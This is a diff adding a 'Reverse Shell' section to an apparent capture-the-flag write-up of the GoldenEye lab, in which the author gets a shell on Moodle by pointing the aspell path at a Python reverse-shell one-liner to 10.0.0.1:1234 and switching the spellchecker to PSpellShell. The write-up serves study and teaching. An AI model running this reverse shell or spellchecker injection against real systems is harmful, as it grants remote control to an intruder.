@@ -246,6 +246,39 @@ After trying some exploits, and not having any luck. I poked around a bit more, 
 
 ![Screenshot]({{ site.baseurl }}/images/posts/2017/goldeneye/systempaths.png)
 
+## iii. Reverse Shell
+
+It seemed that this was the system path for the spellchecker. Which meant, whenever the spellchecker would be called it would execute this command to activate the spellchecker.
+
+I tried replacing the path to aspell with a python reverse shell.
+
+![Screenshot]({{ site.baseurl }}/images/posts/2017/goldeneye/aspellpath.png)
+
+~~~
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+~~~
+
+Then I enumerated Moodle some more and found a location where I can post. (Under blogs)
+
+![Screenshot]({{ site.baseurl }}/images/posts/2017/goldeneye/blog.png)
+
+Nothing happened, I didn't get a shell back. I then read the source code of the Metasploit exploit and realized this exploit was doing the same thing I was doing, a great coincidence. 
+
+I then read the exploit some more, and I found I missed changing the text editor which would use aspell.
+
+![Screenshot]({{ site.baseurl }}/images/posts/2017/goldeneye/metasploit.png)
+
+The exploit is making a POST request to `editorsettingstinymce` and changing the text editor to `PSpellShell`
+(The default was Google Spell), updating the settings:
+
+![Screenshot]({{ site.baseurl }}/images/posts/2017/goldeneye/settings.png)
+
+Now retrying the blog post:
+
+![Screenshot]({{ site.baseurl }}/images/posts/2017/goldeneye/shell.png)
+
 
 
 
